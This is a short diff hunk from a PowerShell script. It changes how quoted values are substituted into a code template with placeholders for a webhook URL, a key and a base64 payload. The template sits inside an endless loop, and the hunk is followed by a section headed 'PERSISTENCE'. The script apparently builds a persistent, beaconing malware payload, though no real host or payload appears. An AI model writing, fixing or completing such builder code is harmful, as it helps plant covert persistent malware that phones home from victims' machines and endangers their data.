@@ -80,8 +80,8 @@ while($true){
 }
 '@
 
-$urlX=("'")+(Dr $W)+("'")
-$bodyLoop=$bodyLoop.Replace('%%WH%%',$urlX).Replace('%%DIR%%',"'"+$D+"'").Replace('%%VER%%',$V).Replace('%%KEY%%',$K).Replace('%%PAYLOAD%%',"'"+$LOADB64+"'")
+$urlX=Dr $W
+$bodyLoop=$bodyLoop.Replace('%%WH%%',$urlX).Replace('%%DIR%%',$D).Replace('%%VER%%',$V).Replace('%%KEY%%',$K).Replace('%%PAYLOAD%%',"'"+$LOADB64+"'")
 $encBody=Cv $bodyLoop
 
 # ========================= PERSISTENCE ==========================
